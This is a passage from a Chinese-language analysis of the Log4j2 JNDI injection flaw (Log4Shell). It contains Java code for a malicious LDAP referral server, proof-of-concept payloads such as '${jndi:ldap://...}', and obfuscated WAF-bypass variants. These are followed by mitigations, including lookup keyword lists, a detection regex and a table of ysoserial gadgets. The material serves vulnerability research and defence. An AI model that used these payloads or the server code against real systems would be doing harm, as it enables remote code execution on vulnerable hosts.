              private URL codebase;
              public OperationInterceptor ( URL cb ) {
                  this.codebase = cb;
              }
              @Override
              public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                  String base = result.getRequest().getBaseDN();
                  Entry e = new Entry(base);
                  try {
                      sendResult(result, base, e);
                  }
                  catch ( Exception e1 ) {
                      e1.printStackTrace();
                  }
              }
              protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, IOException {
                  URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
                  System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
                  e.addAttribute("javaClassName", "th3wind");
                  String cbstring = this.codebase.toString();
                  int refPos = cbstring.indexOf('#');
                  if ( refPos > 0 ) {
                      cbstring = cbstring.substring(0, refPos);
                  }
                  byte[] bytes2 = Base64.decode("**************");
                  e.addAttribute("javaCodeBase", cbstring);
                  e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                  e.addAttribute("javaFactory", this.codebase.getRef());
                  e.addAttribute("javaSerializedData", bytes2);
                  result.sendSearchEntry(e);
                  result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
              }
          }
      }
  * poc：
      logger.error("${jndi:ldap://127.0.0.1:1333/#Exploit}");
### 4、payload变形
  * 利用本身的lookup`${lower:J}`
      logger.error("${${lower:J}ndi:ldap://127.0.0.1:1333/#Exploit}");
  * 利用substitute的解析问题，前文提到关键代码在987行到1029行
总结一下就是截取:-后面的部分，如果存在多个:-则以第一个为准，例如：
    func("asdasdasdasd:-x") = "x";
    func("asdasdasdasd:-asdasdasd:-x") = "asdasdasd:-x"
如果lookup返回null，则把该${}块替换为这样处理后的字符串，因此可以构造payload：
    logger.error("${${anychars:-j}ndi:ldap://127.0.0.1:1333/#Exploit}");
    logger.error("${${anychars:-j}ndi${anychars:-:}ldap://127.0.0.1:1333/#Exploit}"); //特殊字符也可替换
# 三、修复建议
### 1、waf（缓解措施，不能保证过滤全部攻击包
*仅提供思路，不保证正则性能，请根据实际生产情况优化
过滤思路：
①如果不存在`\$\{(.*):-(.*)\}`，则攻击包中必存在连续关键字，直接过滤所有log4j2支持的lookup：
    ${date:
    ${java:
    ${marker:
    ${ctx:
    ${lower:
    ${upper:
    ${jndi:
    ${main:
    ${jvmrunargs:
    ${sys:
    ${env:
    ${log4j:
② 如果存在`\$\{(.*):-(.*)\}`，则文中可能不存在连续关键字，如`${${xxxxx:-l}ower:}`
，但是log4j2语法只支持大小写转换，不会有编码及替换，因此关键字词序不变，且最多存在大小写混淆，可使用：
    // 其他lookup同理
    \$(.*?)\{(.*?)[jJ](.*?)[nN](.*?)[dD](.*?)[iI](.*?):
### 2、网络层控制（缓解措施
禁止非必须出向流量
### 3、升级JDK（缓解措施
高版本JDK的jndi注入利用难度相对较大
### 4、排除非必须反序列化Gadget（缓解措施
参照ysoserial说明文档
         Payload             Authors                                Dependencies
         -------             -------                                ------------         AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
         BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
         C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
         Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
         Clojure             @JackOfMostTrades                      clojure:1.8.0
         CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
         CommonsCollections1 @frohoff                               commons-collections:3.1
         CommonsCollections2 @frohoff                               commons-collections4:4.0
         CommonsCollections3 @frohoff                               commons-collections:3.1
         CommonsCollections4 @frohoff                               commons-collections4:4.0
         CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
         CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
         CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
         FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
         Groovy1             @frohoff                               groovy:2.3.9
         Hibernate1          @mbechler
         Hibernate2          @mbechler
         JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
         JRMPClient          @mbechler
         JRMPListener        @mbechler
         JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
         JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
         Jdk7u21             @frohoff
         Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
         MozillaRhino1       @matthias_kaiser                       js:1.7R2
         MozillaRhino2       @_tint0                                js:1.7R2
         Myfaces1            @mbechler
         Myfaces2            @mbechler
         ROME                @mbechler                              rome:1.0
         Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
         Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
         URLDNS              @gebl
         Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
         Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
### 5、配置关闭lookup功能（缓解措施
  * 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups=true
  * 修改配置 log4j2.formatMsgNoLookups=True
注意：2.10以前版本修改jvm参数无效的
### 6、升级log4j2版本到2.16.0+
注意依赖包里可能存在有漏洞的log4j-api和log4j-core，需一并排查
参考文章：
* * *